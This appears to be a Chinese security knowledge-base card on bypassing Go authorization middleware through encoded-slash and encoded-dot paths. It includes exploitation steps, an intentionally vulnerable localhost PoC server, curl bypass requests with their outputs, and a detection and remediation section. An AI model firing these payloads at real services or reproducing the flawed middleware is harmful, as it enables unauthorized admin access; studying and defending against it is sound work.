---
id: web-golang-escaped-vs-decoded-path-authz-bypass
title: Go 编码视图校验与解码视图路由的授权前缀绕过
type: scenario
domain: web
path: web/golang
technique: escaped-vs-decoded-path-authz-bypass
tags:
- go
- authz
- middleware
- percent-encoding
- path-normalization
- servemux
- waf-bypass
severity: high
confidence: high
status: verified
created: '2026-11-04'
updated: '2026-11-04'
verification:
  verified_by: verifier-V4
  verified_at: '2026-11-04T21:49:59+08:00'
  notes: 已对照原文核对：中间件用 EscapedPath 精确拦截 /admin，业务用 URL.Path 前缀放行，/admin%2F、%2f、%252F、%2e%2e、/admin/. 均返回 ADMIN_SECRET（截图31-36）。该卡是校验/路由视图错配，非 Go 版本专属，未设 versions。未执行PoC
url: /docs/web/golang/web-golang-escaped-vs-decoded-path-authz-bypass/
draft: false
kb_aliases:
- EscapedPath 授权绕过
- Go 路径双视图授权
- '%2F 绕过中间件'
- 编码斜杠鉴权绕过
- admin%2F
---

## 一句话结论

当 Go 中间件用 `r.URL.EscapedPath()`（编码视图）做字面/精确校验，而后续业务路由用 `r.URL.Path`（解码视图）做 `/admin` 前缀判断时，`/admin%2F`、`/admin%2f`、`/admin%252F`、`/admin%2e%2e` 等请求会同时通过两道检查，未授权访问管理功能。

## 原理

- Go 的 `net/url` 对同一请求暴露两份路径：`EscapedPath()` 保留 `%2F`、`%2e` 等编码形态；`Path` 是百分号解码后的形态。两者在编码存在时字面不同。
- 中间件若只拒绝字面 `"/admin"`（`EscapedPath() == "/admin"`），它拦截的是规范化后的单一写法；任何带编码的等价路径都不等于该字面量，直接放行。
- 业务层若用 `strings.HasPrefix(r.URL.Path, "/admin")` 判断，`/admin%2F` 解码为 `/admin/`，`/admin%2e%2e` 解码为 `/admin..`，均满足前缀条件，进入管理逻辑。
- 即使中间件改成了对 `EscapedPath()` 做前缀匹配，`/admin%2F` 的字符串仍以 `/admin` 开头，也可能放行；但若中间件要求匹配 `/admin/` 这个带斜杠的前缀，编码视图里的 `%2F` 不是斜杠，反而失配。关键不是某一种写法，而是**校验与路由各自选择了一份视图，且没有把两份视图归一化到同一语义**。
- 更普遍的解析器分歧：WAF/第三方框架通常把 `%2F` 当作斜杠切段，看到 `/admin/...`；Go 1.22 ServeMux 按编码视图切段，`%2F` 不是分隔符。安全设备与后端路由对同一请求得到不同段集合，攻击者可以让 WAF 看到"无害"、让后端看到"敏感前缀"。
- 明文 `/.` 是例外：`cleanPath` 只识别明文点段，会被折叠并 307 重定向到 `/admin`，随后仍进入业务处理器；编码点段 `%2e` 则不在折叠范围内。

## 触发条件

- Go `net/http` 服务，存在按路径前缀保护的管理/敏感路由。
- 授权中间件使用编码视图（`EscapedPath()`/`RequestURI`）做字面或精确匹配，或与业务层使用不同的路径字段。
- 业务路由/处理器使用解码视图（`URL.Path`、`PathValue`）做前缀或包含判断。
- 敏感功能仅靠路径前缀隔离，没有独立资源级授权。

## 利用步骤

1. 找到只允许特定前缀访问的敏感功能，记录正常访问行为，例如 `GET /admin` 返回 401。
2. 尝试编码斜杠变体：`GET /admin%2F`、`GET /admin%2f`。中间件看编码视图不等于 `/admin`，放行；业务看解码视图 `/admin/` 命中前缀。
3. 若被拦，尝试双重编码 `GET /admin%252F`（解码一次后为 `/admin%2F`）或编码点段 `GET /admin%2e%2e`（解码为 `/admin..`）。
4. 观察响应是否返回管理数据或执行管理操作；同时对比 WAF/代理日志与后端日志中的路径形态差异。
5. 若后端使用 ServeMux 且前缀路由对无尾斜杠返回 307，跟随重定向时注意编码斜杠是否被保留。

## PoC

```go
package main

import (
    "fmt"
    "log"
    "net/http"
    "strings"
)

func admin(w http.ResponseWriter, r *http.Request) {
    // 业务侧按解码 Path 前缀路由到管理功能
    if strings.HasPrefix(r.URL.Path, "/admin") {
        fmt.Fprintf(w, "ADMIN_SECRET [%s]\n", r.URL.Path)
        return
    }
    fmt.Fprintf(w, "PUBLIC [%s]\n", r.URL.Path)
}

func main() {
    mux := http.NewServeMux()
    mux.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
        // 中间件：编码视图精确校验，只拒绝字面 /admin
        if r.URL.EscapedPath() == "/admin" {
            http.Error(w, "AUTH_401", http.StatusUnauthorized)
            return
        }
        admin(w, r)
    })
    log.Fatal(http.ListenAndServe("127.0.0.1:8086", mux))
}
```

```bash
curl -i 'http://127.0.0.1:8086/admin'
# -> 401 AUTH_401

curl -i 'http://127.0.0.1:8086/admin%2F'
# -> 200 ADMIN_SECRET [/admin/]

curl -i 'http://127.0.0.1:8086/admin%2f'
# -> 200 ADMIN_SECRET [/admin/]

curl -i 'http://127.0.0.1:8086/admin%252F'
# -> 200 ADMIN_SECRET [/admin%2F]

curl -i 'http://127.0.0.1:8086/admin%2e%2e'
# -> 200 ADMIN_SECRET [/admin..]
```

```bash
# 明文点段会被 cleanPath 折叠并 307，但重定向后仍进入业务处理器
curl -i --path-as-is 'http://127.0.0.1:8086/admin/.'
# -> 307 Location: /admin
```

## 变体与关联

- 变体：大小写编码 `%2f` 与 `%2F` 等价；双重编码 `%252F` 是否生效取决于解码次数。
- 变体：编码点段 `%2e%2e`、`.%2e` 在编码视图不被折叠，解码后恢复 `..` 或形成 `admin..` 前缀匹配。
- 变体：`RequestURI` 与 `URL.Path` 混用、反向代理重写路径后再交给 Go 服务，也会产生视图差异。
- 变体：WAF/gin/echo 与 ServeMux 对 `%2F` 的段划分不同，可用于同时欺骗 WAF 与后端路由。
- 关联：[[web-golang-servemux-encoded-slash-path-traversal]] 讲同一双视图在文件读取交付层的利用；本卡聚焦授权中间件与业务路由的视图错配。

## 检测与防御

- 检测：同一请求在 WAF、反向代理、应用日志中的路径形态不一致；`EscapedPath` 与 `Path` 的归一化结果不同。
- 检测：敏感路由出现带 `%2F`、`%2e`、`%25` 的访问尝试，且返回 200。
- 修复：授权、路由、交付统一使用同一份解析结果；在入口处做一次规范化（解码 + `path.Clean`），后续全部基于规范化后的路径判断。
- 修复：不要用字符串前缀做授权。敏感资源使用显式资源 ID、路由分组 + 独立中间件或 token 绑定，路径只用于定位。
- 修复：拒绝含编码分隔符（`%2F`、`%5C`）和编码点段的请求，或在解码后重新校验边界。
- 加固：中间件与业务路由共用同一套路径解析函数，避免一个用 `EscapedPath()`、另一个用 `URL.Path`。
- 测试：把 `/admin%2F`、`/admin%2f`、`/admin%252F`、`/admin%2e%2e`、`/admin/.` 写成必须被拒绝的回归用例。
